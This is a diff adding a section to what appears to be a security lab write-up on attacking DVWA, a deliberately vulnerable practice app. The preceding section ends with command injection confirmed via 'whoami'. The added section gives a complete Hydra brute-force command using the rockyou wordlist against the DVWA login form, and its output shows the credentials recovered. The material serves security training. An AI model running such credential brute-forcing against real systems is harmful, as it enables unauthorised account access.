@@ -127,3 +127,24 @@ www-data
 Result:
 * Confirmed server responded with user `www-data`
 * Successfully executed  arbitrary command (`whoami`)
+
+
+---
+
+###HTTP Brute-Force Attack – DVWA Login Page
+
+**Target URL:** http://192.168.64.3/dvwa/login.php  
+**Authentication Type:** HTTP POST Form  
+**Tool Used:** Hydra
+
+**Command Used:**
+```bash
+hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.64.3 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+```
+
+Result: 
+```[80][http-post-form] host: 192.168.64.3   login: admin   password: password```
+
+Summary: 
+* Successfully performed a dictionary-based brute-force attack using a common wordlist
+* Login credentials were discovered due to weak password use
